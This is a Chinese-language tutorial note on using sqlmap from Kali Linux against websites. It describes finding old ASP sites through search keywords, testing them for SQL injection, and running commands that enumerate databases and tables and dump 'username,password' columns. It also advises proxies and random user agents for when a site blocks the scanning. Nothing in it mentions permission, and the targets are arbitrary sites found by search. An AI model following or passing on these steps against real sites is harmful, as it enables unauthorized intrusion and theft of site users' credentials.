# kali使用SQLmap对网站进行渗透
sqlmap是一个自动化sql注入工具，通过python开发，主要功能是扫描，可以通过扫描到的注入漏洞进行数据表破解。<br>
下面针对一些asp站点进行测试(asp站点一般都是比较老的站点网站，可以搜索关键字公司 input:asp?id=查找到一系列asp站点)<br>

<b>补充说明：现在很多的站点基本是没有注入漏洞了，sqlmap对于很多站点已经失效，所以在注入前最好先对目标进行测试，通过在站点后面加上'，或者加上and 1=1和and 1=2来检测是否会被后台检测到sql注入</b>

### 检测是否有注入点
```
sqlmap -u url
```
如果存在注入点，那么就会提示数据库类型的信息，如下：<br>
![accessSQL](E:\git\mygit\Note\img\accessSQL.PNG)<br>

分析：<br>
注入方式为GET，Type和Title信息是注入类型，server是Windows 2008 R2 or 7，web应用程序技术是 ASP.NET,Microsoft IIS 7.5, ASP，数据库是Access<br>

在命令执行过程中，可能会出现选择项，如果想跳过，可以在前面的命令末尾加入"--batch"参数(--batch 不询问用户输入，使用所有默认配置)<br>

### 获取所有的数据库
获取数据库名
```
sqlmap -u url --dbs
```
获取数据库表名（建议忽略上面的那些命令直接用这个方法查出数据表）
```
sqlmap -u url --tables
```
<b>由于asp站点都是暴力随机破解的，所以速度会慢</b>

### 获取数据表列字段
上面命令获取的数据表内容很多，如果想相依获取某一个列字段
```
sqlmap -u url -T columnsname --columns
```

### 获取列数据
```
sqlmap -u url -T columnsname -C "username,password"  --dump
```
-C:指定字段<br>
-dump:导出结果<br>
#### 筛选
筛选上面命令得出的结果：<br>
```
sqlmap -u url -T columnsname -C "username,password" --start 1 --stop 5 --dump
```
--start number:开始行<br>
--stop number:结束行<br>

注意，在进行破解的时候可能会遇到重连的情况<br>

### 错误解决
如果出现了<br>
`[WARNING] if the problem persists please check that the provided target URL is valid. In case that it is, you can try to rerun with the switch '--random-agent' turned on and/or proxy switches ('--ignore-proxy', '--proxy',...)`
<br>
的字样,那么说明是因为频繁访问被拒绝链接了，可以通过代理解决<br>

如果出现：<br>
```
[CRITICAL] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp'). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment')
```
暂时无法找到这个问题的解决<br>

### 更新
```
sqlmap --update
```
如果是更换了阿里源后，sqlmap使用上面方式更新是失败的，此时需要删除掉旧版的，从GitHub下载新版的替代。<br>
```
sudo apt-get remove sqlmap
或
rm -rf /usr/share/sqlmap

git clone https://github.com/sqlmapproject/sqlmap.git
```
替换之后就要使用sqlmap.py替代之前的sqlmap命令<br>

有关sqlmap的更多参数可以参考sqlmap的wiki：<br>

#### 参考:<br>

[英文版参数说明](https://github.com/sqlmapproject/sqlmap/wiki/Usage)<br>

还有本文件同目录下有一个中文版参数说明的txt文件和一份用户手册，可供参考<br>

[SQLMap用户手册【超详细】](https://www.cnblogs.com/hongfei/p/3872156.html)<br>